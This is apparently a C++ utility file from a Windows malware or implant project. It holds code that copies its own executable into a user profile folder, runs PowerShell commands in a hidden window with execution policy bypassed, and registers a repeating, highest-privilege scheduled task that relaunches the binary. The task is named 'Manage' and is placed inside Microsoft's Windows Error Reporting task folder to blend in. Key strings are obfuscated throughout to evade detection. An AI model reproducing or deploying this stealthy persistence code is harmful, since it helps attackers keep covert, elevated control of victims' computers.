#include "util.h"
#include <taskschd.h>
#include <comutil.h>
#include "obfuscate.h"

BOOL GetParameter()
{
	LPWSTR cmdLine = GetCommandLineW();
	int argc = 0;
	LPWSTR* argv = CommandLineToArgvW(cmdLine, &argc);

	if (argc > 1)
	{
		return true;
	}


	return false;
}

bool CreateDirectoryRecursively(const std::string& path) {
	// Try to create the directory
	if (CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
		return true; // Success
	}
	else {
		// If CreateDirectory failed and the error is ERROR_PATH_NOT_FOUND,
		// it means one or more parent directories don't exist.
		if (GetLastError() == ERROR_PATH_NOT_FOUND) {
			// Extract the parent directory from the given path
			size_t pos = path.find_last_of("\\/");
			if (pos != std::string::npos) {
				std::string parentDir = path.substr(0, pos);
				// Recursively create the parent directory
				if (CreateDirectoryRecursively(parentDir)) {
					// Retry creating the original directory after the parent is created
					return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
				}
			}
		}
		return false; // Failed to create directory
	}
}

void RunPowerShellCommand(const char* command)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	ZeroMemory(&pi, sizeof(pi));

	// CString commandLine = _T("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ") + command;
	char commandLine[256];
	strcpy(commandLine, AY_OBFUSCATE("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "));
	strcat(commandLine, command);

	if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		// Handle process creation error
		return;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return;
}

void CopyAllFiles(char* basepath)
{
	// Get the path of the current executable
	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);

	// Extract the directory path from the executable path
	char* lastBackslash = strrchr(path, '\\');
	if (lastBackslash != NULL)
		* (lastBackslash + 1) = '\0';

	// Get the value of the %localappdata% variable
	char destinationPath[MAX_PATH];
	// char destinationAnimPath[MAX_PATH];
	ExpandEnvironmentStringsA(basepath, destinationPath, MAX_PATH);

	// Copy files from the current directory to the destination directory
	WIN32_FIND_DATAA findData;
	char searchPath[MAX_PATH];
	snprintf(searchPath, MAX_PATH, "%s%s", path, "*.*");
	HANDLE findHandle = FindFirstFileA(searchPath, &findData);
	if (findHandle != INVALID_HANDLE_VALUE) {
		do {
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				char sourceFile[MAX_PATH];
				char destinationFile[MAX_PATH];
				snprintf(sourceFile, MAX_PATH, "%s%s", path, findData.cFileName);
				snprintf(destinationFile, MAX_PATH, "%s\\%s", destinationPath, findData.cFileName);
				CopyFileA(sourceFile, destinationFile, FALSE);
			}
		} while (FindNextFileA(findHandle, &findData));

		FindClose(findHandle);
	}
}

BOOL MakeSchedule(std::string time, char* exepath)
{
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
		return 1;
	}

	ITaskService* pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)& pService);
	if (FAILED(hr))
	{
		CoUninitialize();
		return 1;
	}

	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr))
	{
		pService->Release();
		CoUninitialize();
		return 1;
	}

	//get Microsoft's folder and it there is no, it will use root folder
	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(AY_OBFUSCATE("\\Microsoft\\Windows\\Windows Error Reporting")), &pRootFolder);
	if (FAILED(hr))
	{
		hr = pService->GetFolder(_bstr_t("\\"), &pRootFolder);
		if (FAILED(hr))
		{
			pService->Release();
			CoUninitialize();
			return 1;
		}
	}

	ITaskDefinition* pTaskDefinition = NULL;
	hr = pService->NewTask(0, &pTaskDefinition);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTaskDefinition->get_Triggers(&pTriggerCollection);
	if (FAILED(hr))
	{
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITrigger* pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
	if (FAILED(hr))
	{
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITimeTrigger* pTimeTrigger = NULL;
	hr = pTrigger->QueryInterface(IID_ITimeTrigger, (void**)& pTimeTrigger);
	if (FAILED(hr))
	{
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Set the trigger properties
	pTimeTrigger->put_Id(_bstr_t("Trigger1"));
	pTimeTrigger->put_StartBoundary(_bstr_t(AY_OBFUSCATE("2010-10-10T00:00:00")));
	pTimeTrigger->put_EndBoundary(_bstr_t(AY_OBFUSCATE("2030-12-31T23:59:59")));

	IRepetitionPattern* pRepetitionPattern = NULL;
	hr = pTimeTrigger->get_Repetition(&pRepetitionPattern);
	if (FAILED(hr))
	{
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	// Set the repetition pattern properties
	pRepetitionPattern->put_Interval(_bstr_t(time.c_str())); // Repeat every 5 minutes
	//pRepetitionPattern->put_Duration(_bstr_t(INFINITE_TASK_DURATION)); // Repeat for 24 hours

	IActionCollection* pActionCollection = NULL;
	hr = pTaskDefinition->get_Actions(&pActionCollection);
	if (FAILED(hr))
	{
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	IAction* pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	if (FAILED(hr))
	{
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	IExecAction* pExecAction = NULL;
	hr = pAction->QueryInterface(IID_IExecAction, (void**)& pExecAction);
	if (FAILED(hr))
	{
		pAction->Release();
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Set the action properties
	char process_path[MAX_PATH] = { 0 };
	char process_name[MAX_PATH] = { 0 };
	strcpy(process_path, exepath);
	strcat(process_path, "\\");

	GetModuleFileName(NULL, process_name, MAX_PATH);

	// Extract process name from path
	char* processName = strrchr(process_name, '\\'); // Find last occurrence of '\\'
	if (processName != nullptr) {
		processName++; // Move past the '\\'
		strcat(process_path, processName);
	}
	else {
		strcat(process_path, processName);
	}

	// Set the action properties
	CHAR expandedPath[MAX_PATH];
	ExpandEnvironmentStringsA(process_path, expandedPath, MAX_PATH);
	pExecAction->put_Path(_bstr_t(expandedPath));
	pExecAction->put_Arguments(_bstr_t("--check"));

	/////////////////////////////////////////////////////////
	// Get the principal of the task
	IPrincipal* pPrincipal = NULL;
	hr = pTaskDefinition->get_Principal(&pPrincipal);
	if (FAILED(hr))
	{
		pTaskDefinition->Release();
		//	pRegisteredTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);

	// Save the changes to the task
	hr = pTaskDefinition->put_Principal(pPrincipal);
	if (FAILED(hr))
	{
		pPrincipal->Release();
		pTaskDefinition->Release();
		//pRegisteredTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	//////////////////////////////////////////////////////////////
	// Register the task in the root folder
	IRegisteredTask* pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(
		_bstr_t(AY_OBFUSCATE("Manage")),
		pTaskDefinition,
		TASK_CREATE_OR_UPDATE,
		_variant_t(),
		_variant_t(),
		TASK_LOGON_INTERACTIVE_TOKEN,
		_variant_t(L""),
		&pRegisteredTask
	);
	if (FAILED(hr))
	{
		pExecAction->Release();
		pAction->Release();
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Run the task
	IRunningTask* pRunningTask = NULL;
	hr = pRegisteredTask->Run(_variant_t(), &pRunningTask);
	if (FAILED(hr))
	{
		pRegisteredTask->Release();
		pRepetitionPattern->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pAction->Release();
		pActionCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Cleanup
	pRegisteredTask->Release();
	pExecAction->Release();
	pAction->Release();
	pActionCollection->Release();
	pTimeTrigger->Release();
	pTrigger->Release();
	pTriggerCollection->Release();
	pTaskDefinition->Release();
	pRootFolder->Release();
	pService->Release();
	CoUninitialize();

	return 0;
}
